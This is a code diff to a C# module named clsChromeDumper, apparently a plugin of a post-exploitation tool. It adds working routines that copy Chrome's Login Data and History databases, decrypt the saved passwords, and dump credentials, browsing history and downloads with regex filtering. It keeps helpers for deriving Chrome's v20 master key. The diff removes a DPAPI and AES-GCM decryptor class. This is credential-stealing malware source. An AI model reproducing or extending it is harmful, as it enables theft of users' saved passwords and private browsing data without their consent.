@@ -26,17 +26,14 @@ namespace Plugin48Dumper
 {
     public class clsChromeDumper : clsDumper
     {
-        private string LocalApplicationData = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
-        private string ApplicationData = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
-
         private string ChromeDir { get { return Path.Combine(ApplicationData, "Google"); } }
         private string UserDataFile { get { return Path.Combine(LocalApplicationData, "Google", "Chrome", "User Data"); } }
         private string DefaultDir { get { return Path.Combine(UserDataFile, "Default"); } }
+        private string LocalStateFile { get { return Path.Combine(UserDataFile, "Local State"); } }
 
         private string BookMarkFile { get { return Path.Combine(DefaultDir, "Bookmarks"); } }
         private string HistoryFile { get { return Path.Combine(DefaultDir, "History"); } }
         private string LoginFile { get { return Path.Combine(DefaultDir, "Login Data"); } }
-        private string LocalStateFile { get { return Path.Combine(UserDataFile, "Local State"); } }
         private string WebDataFile { get { return Path.Combine(DefaultDir, "Web Data"); } }
 
         public DataTable dtHelp = new DataTable();
@@ -54,7 +51,6 @@ namespace Plugin48Dumper
             dtHelp.Rows.Add("cred", "Dump credentials.");
             dtHelp.Rows.Add("history", "Dump browser history records.");
             dtHelp.Rows.Add("download", "Dump downloaded files.");
-            //dtHelp.Rows.Add("address", "Dump user's addresses.");
             dtHelp.Rows.Add("bookmark", "Dump browser bookmarks.");
 
             Available = File.Exists(LoginFile);
@@ -62,6 +58,8 @@ namespace Plugin48Dumper
 
         public class clsCredential
         {
+            public bool Decrypted;
+
             public string URL;
             public string Username;
             public string Password;
@@ -102,14 +100,13 @@ namespace Plugin48Dumper
             public string szLastUsed;
         }
 
-        public class clsCreditCard
+        public override void fnRun(List<string> lsArgs)
         {
-            
-        }
-
-        public class clsAddress
-        {
-
+            if (lsArgs.Count == 0)
+            {
+                clsTools.fnPrintTable(dtHelp);
+                return;
+            }
         }
 
         public List<clsCredential> fnDumpCredential(int nCount = 100, string szRegex = "")
@@ -131,28 +128,46 @@ namespace Plugin48Dumper
             for (int i = 0; i < nCount; i++)
             {
                 var origin_url = handler.GetValue(i, "origin_url");
-                var username_value = "N/A";
-                var password_value = handler.GetValue(i, "password_value");
+                var username_value = handler.GetValue(i, "username_value");
+                var password_value = "[FAILED]";
                 var date_created = handler.GetValue(i, "date_created");
                 var date_last_used = handler.GetValue(i, "date_last_used");
 
-                //handler.GetValue(i, "username_value");
+                try
+                {
+                    date_created = fnChromeTimeToDateTime(long.Parse(date_created))?.ToString("F");
+                    date_last_used = fnChromeTimeToDateTime(long.Parse(date_last_used))?.ToString("F");
+                }
+                catch (Exception ex)
+                {
+                    clsTools.fnLogError(ex.Message);
+                }
+
+                bool bDecrypted = false;
 
                 try
                 {
-
+                    password_value = decryptor.Decrypt(handler.GetValue(i, "password_value"));
+                    bDecrypted = true;
                 }
                 catch (Exception ex)
                 {
                     
                 }
 
-                ls.Add(new clsCredential
+                if (!string.IsNullOrEmpty(origin_url) && (Regex.IsMatch(origin_url, szRegex) || Regex.IsMatch(username_value, szRegex)))
                 {
-                    URL = origin_url,
-                    Username = username_value,
+                    ls.Add(new clsCredential
+                    {
+                        Decrypted = bDecrypted,
 
-                })
+                        URL = origin_url,
+                        Username = username_value,
+                        Password = password_value,
+                        szCreationDate = date_created,
+                        szLastUsed = date_last_used,
+                    });
+                }
             }
 
             /*
@@ -246,6 +261,32 @@ namespace Plugin48Dumper
             string dst = Path.Combine(Path.GetTempPath(), Guid.NewGuid().ToString());
             File.Copy(HistoryFile, dst, true);
 
+            var handler = new clsSQLiteHandler(dst);
+            if (!handler.ReadTable("urls"))
+                return ls;
+
+            int nRowCount = handler.GetRowCount();
+            clsTools.fnLogInfo($"Total records: {nRowCount}");
+
+            for (int i = 0; i < nCount; i++)
+            {
+                var url = handler.GetValue(i, "url");
+                var title = handler.GetValue(i, "title");
+                var last_visit_time = handler.GetValue(i, "last_visit_time");
+
+                if (!string.IsNullOrEmpty(url) && !string.IsNullOrEmpty(title) &&
+                    (Regex.IsMatch(url, szRegex) || Regex.IsMatch(title, szRegex))
+                )
+                {
+                    ls.Add(new clsHistory
+                    {
+                        URL = url,
+                        Title = title,
+                        szLastUsed = fnChromeTimeToDateTime(long.Parse(last_visit_time))?.ToString("F"),
+                    });
+                }
+            }
+
             /*
             string szConnString = fnConnString(dst);
             using (var conn = new SQLiteConnection(szConnString))
@@ -309,6 +350,29 @@ namespace Plugin48Dumper
 
             string szDst = fnNewTempFilePath();
             File.Copy(HistoryFile, szDst);
+
+            var handler = new clsSQLiteHandler(szDst);
+            if (!handler.ReadTable("downloads"))
+                return ls;
+
+            int nRowCount = handler.GetRowCount();
+            clsTools.fnLogInfo($"Total records: {nRowCount}");
+
+            for (int i = 0; i < nCount; i++)
+            {
+                var target_path = handler.GetValue(i, "target_path");
+                var total_bytes = handler.GetValue(i, "total_bytes");
+                var tab_url = handler.GetValue(i, "tab_url");
+                var end_time = handler.GetValue(i, "end_time");
+
+                ls.Add(new clsDownload
+                {
+                    TargetPath = target_path,
+                    Length = long.Parse(total_bytes),
+                    URL = tab_url,
+                    szDate = fnChromeTimeToDateTime(long.Parse(end_time))?.ToString("F"),
+                });
+            }
 
             /*
             string szConnStr = fnConnString(szDst);
@@ -430,6 +494,8 @@ namespace Plugin48Dumper
 
             var dicParsedData = fnParseKeyBlob(abKeyUser);
             byte[] abV20MasterKey = fnDeriveV20MasterKey(dicParsedData);
+
+
 
             /*
             string szConnStr = fnConnString(szTempCookiePath);
@@ -1144,78 +1210,6 @@ namespace Plugin48Dumper
 
             [DllImport("ncrypt.dll")]
             static extern int NCryptFreeObject(IntPtr hObject);
-        }
-
-        public class ChromiumDecryptor
-        {
-            private readonly byte[] _key;
-
-            public ChromiumDecryptor(string localStatePath)
-            {
-                try
-                {
-                    if (File.Exists(localStatePath))
-                    {
-                        string localState = File.ReadAllText(localStatePath);
-
-                        var subStr = localState.IndexOf("encrypted_key") + "encrypted_key".Length + 3;
-
-                        var encKeyStr = localState.Substring(subStr).Substring(0, localState.Substring(subStr).IndexOf('"'));
-
-                        _key = ProtectedData.Unprotect(Convert.FromBase64String(encKeyStr).Skip(5).ToArray(), null,
-                            DataProtectionScope.CurrentUser);
-                    }
-                }
-                catch (Exception e)
-                {
-                    Debug.WriteLine(e);
-                }
-            }
-
-            public string Decrypt(string cipherText)
-            {
-                var cipherTextBytes = Encoding.Default.GetBytes(cipherText);
-                if (cipherText.StartsWith("v10") && _key != null)
-                {
-                    return Encoding.UTF8.GetString(DecryptAesGcm(cipherTextBytes, _key, 3));
-                }
-                return Encoding.UTF8.GetString(ProtectedData.Unprotect(cipherTextBytes, null, DataProtectionScope.CurrentUser));
-            }
-
-            private byte[] DecryptAesGcm(byte[] message, byte[] key, int nonSecretPayloadLength)
-            {
-                // TODO: Replace with .NET-own AES-GCM implementation in .NET Core 3.0+
-                const int KEY_BIT_SIZE = 256;
-                const int MAC_BIT_SIZE = 128;
-                const int NONCE_BIT_SIZE = 96;
-
-                if (key == null || key.Length != KEY_BIT_SIZE / 8)
-                    throw new ArgumentException($"Key needs to be {KEY_BIT_SIZE} bit!", nameof(key));
-                if (message == null || message.Length == 0)
-                    throw new ArgumentException("Message required!", nameof(message));
-
-                using (var cipherStream = new MemoryStream(message))
-                using (var cipherReader = new BinaryReader(cipherStream))
-                {
-                    var nonSecretPayload = cipherReader.ReadBytes(nonSecretPayloadLength);
-                    var nonce = cipherReader.ReadBytes(NONCE_BIT_SIZE / 8);
-                    var cipher = new GcmBlockCipher(new AesEngine());
-                    var parameters = new AeadParameters(new KeyParameter(key), MAC_BIT_SIZE, nonce);
-                    cipher.Init(false, parameters);
-                    var cipherText = cipherReader.ReadBytes(message.Length);
-                    var plainText = new byte[cipher.GetOutputSize(cipherText.Length)];
-                    try
-                    {
-                        var len = cipher.ProcessBytes(cipherText, 0, cipherText.Length, plainText, 0);
-                        cipher.DoFinal(plainText, len);
-                    }
-                    catch (InvalidCipherTextException)
-                    {
-                        return null;
-                    }
-                    return plainText;
-                }
-            }
         }
     }
 }
